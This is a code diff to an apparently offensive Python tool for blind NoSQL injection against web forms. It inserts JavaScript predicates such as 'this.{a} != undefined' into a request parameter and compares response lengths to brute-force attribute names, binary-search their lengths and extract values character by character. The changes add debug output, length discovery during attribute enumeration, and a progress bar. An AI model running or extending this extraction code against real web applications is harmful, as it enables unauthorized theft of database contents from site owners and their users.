@@ -82,7 +82,7 @@ def get_random_payload_response(form_data, scan_param_name, url):
     return default_response
 
 
-def send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):
+def send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response, debug=False):
     # create payload by replacing injection point 
     payload = extraction_point.replace("§inject§", extraction_payload)
     # insert payload into request
@@ -90,7 +90,10 @@ def send_extraction_request(url, form_data, extraction_point, extraction_payload
     response = send_post_request(url, r_data)
     if response == None:
         raise Exception("Extraction response is None")
-    return len(response.text) != len(default_response.text)
+    res = len(response.text) != len(default_response.text)
+    if debug:
+        print(url, r_data, res)
+    return res
 
 def send_post_request(r_url, r_data):
     #print("Requesting:",r_url, r_data)
@@ -106,13 +109,14 @@ def brute_attribute_names(url, form_data,insertion_param_name, default_response,
     found_attributes = []    
     for a in attributes_list:       
         extraction_payload = f'this.{a} != undefined'        
-        if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):
-            found_attributes.append(a)
-            print("\t[+] Found potential attribute:", a)
+        if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):            
+            attr_length = get_extraction_parameter_length(url, form_data,insertion_param_name, default_response, extraction_point, a)
+            if attr_length:
+                found_attributes.append([a,attr_length])
+                print(f"\t[+] Found attribute: {a} with length {attr_length}")
     return found_attributes
 
-def get_extraction_parameter_length(url, form_data,insertion_param_name, default_response, extraction_point, extraction_attribute_name):
-    print(f"Extracting length of {extraction_attribute_name} ...")
+def get_extraction_parameter_length(url, form_data,insertion_param_name, default_response, extraction_point, extraction_attribute_name):    
     low = 1 
     high = 1000 
     mid = 0
@@ -167,6 +171,7 @@ def brute_extract_data(url, form_data,scan_param_name, default_response, extract
 
         if not new_found:
             raise Exception(f"No new char could be found for: {extraction_attribute_name} at index {i} (max length: {extraction_attribute_length})")                                 
+    progress_bar(i, extraction_attribute_length)
     print()
     return result
 
